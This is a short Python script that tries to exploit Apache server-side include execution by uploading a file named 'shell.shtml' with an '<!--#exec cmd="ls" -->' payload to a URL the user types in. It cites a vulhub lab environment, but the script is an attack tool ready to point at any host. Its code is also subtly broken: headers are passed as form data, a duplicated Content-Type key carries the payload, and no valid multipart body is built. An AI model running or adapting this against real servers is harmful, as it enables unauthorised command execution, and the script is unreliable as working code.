import requests
def apache_ssi():
    print('参考链接:https://vulhub.org/#/environments/httpd/ssi-rce/\n')
    url=input('url:')
    data={'Host':url,'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2','Accept-Encoding':'gzip, deflate',
        'Content-Type':'multipart/form-data','Content-Length': '247','Origin':url,'Connection':'close',
        'Referer':url,'Upgrade-Insecure-Requests':'1','Content-Disposition':'form-data; name="file_upload"; filename="shell.shtml"',
        'Content-Type':'text/html<!--#exec cmd="ls" -->'}
    fhz=str(requests.post(url=url,data=data).status_code)
    print(fhz+'ok')